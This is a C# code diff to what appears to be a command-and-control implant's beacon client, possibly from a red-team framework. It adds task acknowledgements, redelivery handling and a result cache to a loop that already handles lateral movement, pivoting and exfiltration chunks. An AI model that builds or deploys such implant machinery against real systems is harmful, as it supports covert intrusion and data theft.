@@ -62,6 +62,11 @@ internal sealed class Beacon : ICheckInClient
     // with the envelope client when both cover one run.
     private readonly TaskNonceTracker _nonces;
 
+    // The held-task ledger (architecture.md Sec 10.3 -- the dispatch strand):
+    // the dedup and result cache behind the receive-ack arm, shared by every
+    // check-in client covering one run the same way the nonce floor is.
+    private readonly HeldTaskLedger _held;
+
     /// <summary>
     /// Builds a Beacon whose handler registry carries no enroll bundle, so the
     /// lateral.move handler reports derivation as unavailable.
@@ -81,8 +86,8 @@ internal sealed class Beacon : ICheckInClient
     public Beacon(string mode, EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
-        TaskNonceTracker? nonces = null, Cadence? cadence = null)
-        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces, cadence)
+        TaskNonceTracker? nonces = null, Cadence? cadence = null, HeldTaskLedger? held = null)
+        : this(egress, implantId, leaf, privateKey, cas, sleep, jitter, killDate, enroll, classVerbs, log, nonces, cadence, held)
     {
         _mode = mode;
     }
@@ -98,11 +103,12 @@ internal sealed class Beacon : ICheckInClient
     /// check-in client covering the same run (the envelope client); null keeps
     /// this beacon's own tracker. <paramref name="cadence"/> is the live
     /// check-in cadence beacon.sleep retunes; null keeps the baked pair.
+    /// <paramref name="held"/> shares the held-task ledger the same way.
     /// </summary>
     public Beacon(EgressEndpoints egress, string implantId, X509Certificate2 leaf, ECDsa privateKey,
         IReadOnlyList<X509Certificate2> cas, TimeSpan sleep, TimeSpan jitter, DateTimeOffset? killDate,
         EnrollBundle? enroll, IReadOnlyList<string> classVerbs, TextWriter log,
-        TaskNonceTracker? nonces = null, Cadence? cadence = null)
+        TaskNonceTracker? nonces = null, Cadence? cadence = null, HeldTaskLedger? held = null)
     {
         _mode = BeaconModes.Stream;
         _egress = egress;
@@ -128,6 +134,7 @@ internal sealed class Beacon : ICheckInClient
         _classVerbs = classVerbs;
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
+        _held = held ?? new HeldTaskLedger();
     }
 
     /// <summary>
@@ -176,10 +183,15 @@ internal sealed class Beacon : ICheckInClient
             catch (RpcException ex)
             {
                 _log.WriteLine($"beacon stream ended: {ex.Status.Detail}");
+                // The stream died mid-flight: results written on it may never
+                // have been read, so their delivery marks clear and the next
+                // connection re-sends them (first-wins server-side).
+                _held.InvalidateDeliveries();
             }
             catch (Exception ex)
             {
                 _log.WriteLine($"beacon stream ended: {ex.Message}");
+                _held.InvalidateDeliveries();
             }
 
             // A handshake refusal is permanent for this artifact (retired, kill
@@ -279,6 +291,12 @@ internal sealed class Beacon : ICheckInClient
             // one is refused. A server that does not echo keeps the nonce-less
             // shape, and verification falls back to the original tuple.
             ReplayNonces = true,
+            // Advertise the receive-ack arm (architecture.md Sec 10.3): when
+            // the server echoes it, every parsed task is acked before it
+            // executes, and a stream that dies before the ack makes the
+            // server redeliver. A server that does not echo keeps today's
+            // dispatch semantics -- no acks sent, nothing re-delivered.
+            TaskAcks = true,
         };
         handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
         await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
@@ -296,6 +314,12 @@ internal sealed class Beacon : ICheckInClient
             return BeaconCycleResult.Terminal;
         }
         _nonces.Negotiated = hs.ReplayNonces;
+        // The receive-ack arm (architecture.md Sec 10.3): negotiated per
+        // connection, so read it here rather than tracking it on shared state.
+        // A server that does not echo keeps today's dispatch semantics -- and
+        // the dedup ledger still guards, because a redelivery can arrive from
+        // a carrier that did negotiate.
+        var acks = hs.TaskAcks;
         _log.WriteLine($"handshake ok: engagement={hs.EngagementId}, replay-nonces={hs.ReplayNonces}");
 
         // Tasking loop: read TaskRequest downstream, dispatch, write TaskResult
@@ -315,6 +339,20 @@ internal sealed class Beacon : ICheckInClient
         var writeGate = new SemaphoreSlim(1, 1);
         var liveChannels = new ConcurrentDictionary<string, BeaconLiveChannel>();
         using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+
+        // Results whose delivery died with an earlier stream ride this one
+        // first (architecture.md Sec 10.3 -- the dispatch strand): the server
+        // records first-wins, so a re-send of a result the original stream
+        // already landed is absorbed, and one it lost is recovered.
+        foreach (var remembered in _held.Undelivered())
+        {
+            await WriteFrameAsync(
+                call, writeGate,
+                ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
+                cancellationToken);
+            _held.MarkDelivered(remembered.TaskId);
+        }
+
         try
         {
             while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
@@ -332,6 +370,13 @@ internal sealed class Beacon : ICheckInClient
                 }
 
                 var task = TaskRequest.Parser.ParseFrom(frame.Payload);
+
+                // The dispatch strand's ack half (architecture.md Sec 10.3):
+                // delivery evidence for the parsed frame, sent before anything
+                // runs -- including a task the verifier below will refuse,
+                // because a refused task is still a delivered one.
+                if (acks)
+                    await WriteFrameAsync(call, writeGate, AckFrame(task.TaskId), cancellationToken);
 
                 // Fronted tasking (architecture.md Sec 5.2): a frame marked
                 // with another implant's id is a Pivot child's tasking this
@@ -351,10 +396,9 @@ internal sealed class Beacon : ICheckInClient
                     if (_fronted is null || !_fronted.Knows(targetId))
                     {
                         _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
-                        await WriteFrameAsync(
-                            call, writeGate,
-                            ResultFrame(task, TaskOutcome.Failed,
-                                $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed"),
+                        await ReportResultAsync(
+                            call, writeGate, task.TaskId, TaskOutcome.Failed,
+                            $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed",
                             cancellationToken);
                         continue;
                     }
@@ -392,6 +436,33 @@ internal sealed class Beacon : ICheckInClient
                     output = cause;
                     chunks = Array.Empty<ExfilChunk>();
                 }
+                else if (_held.Contains(task.TaskId))
+                {
+                    // The dispatch strand's dedup half (architecture.md Sec
+                    // 10.3), deliberately AFTER verification: the replay
+                    // defense stays ahead of the ledger, so a verbatim replay
+                    // of a held task still falls at the nonce floor (or the
+                    // signature) and is refused on the task. A redelivery
+                    // that cleared verification re-sends the cached result
+                    // unconditionally -- a redelivery implies the server
+                    // holds no recorded result (its first-wins dropped or
+                    // never saw the original), and the duplicate a completed
+                    // server would see is a no-op there. Nothing re-executes.
+                    if (_held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
+                    {
+                        await ReportResultAsync(
+                            call, writeGate, task.TaskId, heldOutcome, heldOutput, cancellationToken);
+                        _log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
+                    }
+                    else
+                    {
+                        // Held but unfinished (a channel that died with its
+                        // stream, a task still running): nothing to re-send
+                        // and nothing to re-run.
+                        _log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
+                    }
+                    continue;
+                }
                 else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
                 {
                     // The streaming shape: the task opens a channel instead of
@@ -401,13 +472,13 @@ internal sealed class Beacon : ICheckInClient
                     // reported on the task itself. On a live stream the handler
                     // runs in the background and reports its own final
                     // TaskResult; the loop keeps reading while it runs.
+                    _held.Hold(task.TaskId);
                     if (IsPoll)
                     {
                         _log.WriteLine($"task {task.TaskId} refused: no channel on a poll cycle");
-                        await WriteFrameAsync(
-                            call, writeGate,
-                            ResultFrame(task, TaskOutcome.Failed,
-                                $"{task.Verb} requires a stream-mode check-in; a poll cycle carries no channel"),
+                        await ReportResultAsync(
+                            call, writeGate, task.TaskId, TaskOutcome.Failed,
+                            $"{task.Verb} requires a stream-mode check-in; a poll cycle carries no channel",
                             cancellationToken);
                     }
                     else
@@ -426,7 +497,12 @@ internal sealed class Beacon : ICheckInClient
                     (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
                 }
 
-                await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), cancellationToken);
+                // Held from here on whatever the outcome was -- a refused
+                // task is parsed and answered too, and its redelivery is
+                // answered from the cache the same way (the channel branch
+                // held above, before its early continue).
+                _held.Hold(task.TaskId);
+                await ReportResultAsync(call, writeGate, task.TaskId, outcome, output, cancellationToken);
 
                 // Out-of-band exfil chunks follow the TaskResult on the same stream.
                 // Each carries the task id so the server reassembles and routes them
@@ -500,16 +576,45 @@ internal sealed class Beacon : ICheckInClient
     }
 
     private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
+        => ResultFrame(task.TaskId, outcome, output);
+
+    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
         => new()
         {
             Payload = ByteString.CopyFrom(new TaskResult
             {
-                TaskId = task.TaskId,
+                TaskId = taskId,
                 Outcome = outcome,
                 Output = output,
             }.ToByteArray()),
             Kind = FrameKind.TaskResult,
         };
+
+    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
+    // one parsed task, sent before anything executes.
+    private static Frame AckFrame(string taskId)
+        => new()
+        {
+            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
+            Kind = FrameKind.TaskAck,
+        };
+
+    // Writes one task result and caches it in the held-task ledger: the cache
+    // is what a redelivery re-sends, and the delivery mark is what a dying
+    // stream clears so the next connection re-sends it (first-wins
+    // server-side).
+    private async Task ReportResultAsync(
+        AsyncDuplexStreamingCall<Frame, Frame> call,
+        SemaphoreSlim writeGate,
+        string taskId,
+        TaskOutcome outcome,
+        string output,
+        CancellationToken cancellationToken)
+    {
+        await WriteFrameAsync(call, writeGate, ResultFrame(taskId, outcome, output), cancellationToken);
+        _held.Remember(taskId, outcome, output);
+        _held.MarkDelivered(taskId);
+    }
 
     // Opens a channel for a dispatched streaming task and starts its handler
     // in the background: the loop returns to reading immediately, the channel
@@ -548,6 +653,8 @@ internal sealed class Beacon : ICheckInClient
         {
             var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
             await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
+            _held.Remember(task.TaskId, outcome, output);
+            _held.MarkDelivered(task.TaskId);
             _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
         }
         catch (Exception ex)
